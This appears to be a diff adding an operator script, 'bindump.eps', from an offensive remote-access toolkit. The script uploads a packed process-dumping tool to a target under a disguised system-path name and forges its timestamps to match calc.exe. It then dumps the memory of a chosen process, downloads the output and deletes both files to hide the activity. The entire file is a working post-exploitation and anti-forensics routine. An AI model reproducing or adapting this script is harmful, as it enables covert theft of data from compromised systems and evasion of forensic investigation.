@@ -1,0 +1,89 @@
+#-------------------------------------------------------------------------------
+# File: bindump.eps
+# Description: Tries to run bindump on the target.
+#
+# 26 July 2007  Created....
+#
+#-------------------------------------------------------------------------------
+int $offendingPID = GetInput("What is the PID for the offending process? (\"-1\" to exit)");
+
+if ($offendingPID == -1) {
+	return false;
+}
+
+string $ScriptsDir = GetEnv("SCRIPTSDIR");
+string $resources = GetEnv("RESOURCESDIR");
+
+@echo on;
+
+string $remoteToolName = GetEnv("remoteToolName");
+string $sSysPath = GetEnv("SYSPATH");
+
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+ifnot (prompt "Do you want to upload the tool as \"$remoteToolName\" ?") {
+	$remoteToolName=GetInput("What do you want to upload the tool as?");
+}
+
+SetEnv("remoteToolName", "$remoteToolName");
+
+string $split = SplitPath("$remoteToolName");
+
+
+while (`put $ScriptsDir\\..\\..\\..\\B-Tools\\bindump_packed.exe -name $remoteToolName` == false) {
+	if (prompt "File exists, delete \"$remoteToolName\"?") {
+		`del $split[1] -path "$split[0]"`;
+		sleep(200);
+	} else {
+		return false;
+	}
+}
+@echo off;
+`matchtimes $sSysPath\\calc.exe $remoteToolName`;
+@record on;
+`run -command "$remoteToolName $offendingPID" -redirect`;
+@record off;
+@echo on;
+
+#grep out the sizes:
+string $output = GetCmdData("output");
+
+WriteFile("$resources\\bindmp.out",false,$output);
+
+@record on;
+`local grep -mask $resources\\bindmp.out -pattern "Module: 0"`;
+@record off;
+`local run -command "cmd.exe /C del $resources\\bindmp.out"`;
+string $match = GetCmdData("line_data");
+if (sizeof($match) == 0) {
+	echo "Something when wrong, are you sure that PID exists?";
+	prompt `del $split[1] -path "$split[0]"`;
+	
+	return false;
+}
+
+echo "The size of the bin-dump output is listed (IN HEX) as the last line above.";
+echo "IF THIS AMOUNT IS REALLY BIG, OR IF THERE IS NOT 2X THIS AMOUNT OF ROOM ON THE DISK, SAY NO HERE.";
+
+if (prompt "\nDo you want to bindump this exe?") {
+	@echo off;
+	prompt `run -command "$remoteToolName $offendingPID ~Wa8z1.tmp 0" -redirect bindump`;
+	@echo on;
+}
+
+
+`dir ~Wa8z1.tmp`;
+if (prompt "Download \"~Wa8z1.tmp\" (the output file, size listed above)?") {
+	`get ~Wa8z1.tmp`;
+} 
+
+if (prompt "Delete both files? (wait until get is done)") {
+	`del ~Wa8z1.tmp`;
+	`del $split[1] -path "$split[0]"`;
+	`dir ~Wa8z1.tmp`;
+	`dir $split[1] -path "$split[0]"`;
+}
+
+return true;
